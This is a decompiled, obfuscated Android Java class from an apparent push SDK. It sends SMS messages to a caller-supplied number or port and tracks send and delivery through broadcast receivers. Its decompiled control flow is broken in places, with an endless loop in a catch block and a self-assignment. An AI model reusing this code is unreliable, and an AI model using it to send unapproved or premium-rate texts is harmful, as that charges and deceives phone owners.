package com.push2.sdk.util;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build.VERSION;
import android.telephony.SmsManager;
import android.util.Log;
import java.util.Timer;

public class SMSUtil
{
  public static Timer a;
  private static SMSUtil.a b;
  private static Context c;
  private static BroadcastReceiver d = new SMSUtil.1();
  private static BroadcastReceiver e = new SMSUtil.2();
  
  public static void a()
  {
    try
    {
      if ((b() != null) && (d != null)) {
        b().unregisterReceiver(d);
      }
    }
    catch (Exception localException1)
    {
      for (;;)
      {
        try
        {
          if ((b() != null) && (e != null)) {
            b().unregisterReceiver(e);
          }
          return;
        }
        catch (Exception localException2)
        {
          i.e("GZ", "unregister sendSMSFinishReceiver fail!");
        }
        localException1 = localException1;
        i.e("GZ", "unregister sendSMSReceiver fail!");
      }
    }
  }
  
  public static void a(Context paramContext)
  {
    c = paramContext;
  }
  
  public static void a(Context paramContext, SMSUtil.a paramA)
  {
    a(paramA);
    a(paramContext);
    paramContext.registerReceiver(d, new IntentFilter("com.pushy.sms.send"));
    paramContext.registerReceiver(e, new IntentFilter("com.pushy.sms.delivery"));
  }
  
  public static void a(Context paramContext, String paramString1, String paramString2)
  {
    if ((paramString2 != null) && (!"".equals(paramString2)) && (paramString1 != null) && (!"".equals(paramString1)))
    {
      SmsManager.getDefault().sendTextMessage(paramString2, null, paramString1, PendingIntent.getBroadcast(paramContext, 0, new Intent("com.pushy.sms.send"), 0), PendingIntent.getBroadcast(paramContext, 0, new Intent("com.pushy.sms.delivery"), 0));
      if (Build.VERSION.SDK_INT >= 19)
      {
        a = new Timer();
        a.schedule(new SMSUtil.MyTask(), 30000L);
      }
    }
    while (c() == null) {
      return;
    }
    c().b("发送信息或端口号有误. content=" + paramString1 + ",smsAddress=" + paramString2);
    Log.e("GZ", "发送信息或端口号有误. content=" + paramString1 + ",smsAddress=" + paramString2);
  }
  
  public static void a(SMSUtil.a paramA)
  {
    b = paramA;
  }
  
  public static Context b()
  {
    return c;
  }
  
  public static SMSUtil.a c()
  {
    return b;
  }
}
